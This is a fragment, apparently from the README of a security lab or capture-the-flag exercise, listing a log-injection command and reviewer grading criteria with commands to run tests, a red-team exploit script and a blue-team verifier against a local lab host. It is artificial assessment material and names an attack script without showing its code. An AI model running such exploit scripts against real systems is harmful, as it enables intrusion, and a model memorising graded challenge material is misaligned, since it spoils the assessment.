python3 scripts/inject_logs.py /opt/admin/logs
```

---

## Reviewer Notes & Grading Criteria

- **ES Modules & Node.js Standards:** The application is written in clean, modern Node.js using ES Modules (`"type": "module"`), Express, and idiomatic middleware architecture.
- **Realistic Telemetry Pipeline:** The logger generates standard Nginx combined logs with custom extended fields (`X-Forwarded-For` exfiltration) and structured security audit alerts in `error.log`.
- **Reproducible Assessment Proof:** Every flag, endpoint, and mitigation path can be validated instantly by running:
  - `cd app && npm test`
  - `python3 scripts/red_team_exploit.py http://feedback.admin.local:3075`
  - `python3 scripts/blue_team_verify.py /opt/admin/logs`